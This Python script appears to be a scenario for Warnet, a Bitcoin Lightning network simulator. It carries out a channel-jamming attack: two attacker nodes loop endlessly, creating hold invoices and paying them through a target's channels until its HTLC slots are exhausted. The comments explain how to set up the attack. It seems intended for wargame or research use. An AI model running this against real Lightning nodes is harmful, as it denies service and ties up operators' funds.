#!/usr/bin/env python3

import base64
import json
import random
from commander import Commander
from time import sleep

class LNChannelJam(Commander):
    def set_test_params(self):
        # This is just a minimum
        self.num_nodes = 0
        self.miners = []

    def add_options(self, parser):
        parser.description = "Send hold invoices between two lightning nodes"
        parser.usage = "warnet run /path/to/ln_channel_jam.py"

    def run_test(self):
        ########
        # Setup:
        #
        # 1. Find your target node on the network and identify all its channel partners:
        #
        #    <spender> --- <router> --- <recipient>
        #
        # 2. Create channels from attacker nodes to the target THROUGH its peers.
        #    You may have to open multiple channels from the attacker nodes
        #    to ensure you have anough HTLC capacity and BTC liquidity.
        #
        #                   +-+                                          +-+
        #                  /   \                                        /   \
        #    [armada-1-ln] ----- <spender> --- <router> --- <recipient> ----- [armada-2-ln]
        #                  \   /                                        \   /
        #                   +-+                                          +-+
        #
        # 3. Run this scenario, which will generate and attempt to pay "hold invoices"
        #    between the two attack nodes. Eventually these attempts will start to
        #    fail once the target's channels are jammed with the maximum number
        #    of unsettled, in-flight HTLCs.
        #    https://buildonln.com/advanced/hold_invoices.html
        #    https://bitcoinops.org/en/topics/channel-jamming-attacks/
        ########

        SENDER = "armada-1-ln"
        RECIEVER = "armada-2-ln"

        # Clear the Warnet default random seed
        random.seed(None)
        while True:
            # Create a hold invoice on armada-2-ln using the REST API
            # https://lightning.engineering/api-docs/api/lnd/invoices/add-hold-invoice/
            payment_hash = base64.b64encode(random.randbytes(32)).decode()
            response = self.lns[RECIEVER].post(
                "/v2/invoices/hodl",
                data={
                    "value": 600,
                    "hash":  payment_hash
                }
            )
            json_response = json.loads(response)
            self.log.info(f"Got hold invoice from {RECIEVER}: add_index: {json_response['add_index']}")
            invoice = json_response["payment_request"]

            # Attempt to pay the invoice on armada-1-ln using warnet helper functions
            response = self.lns[SENDER].payinvoice(invoice)
            self.log.info(f"Sent payment from {SENDER}: payment_index: {response['result']['payment_index']}")
            sleep(1)

def main():
    LNChannelJam().main()

if __name__ == "__main__":
    main()
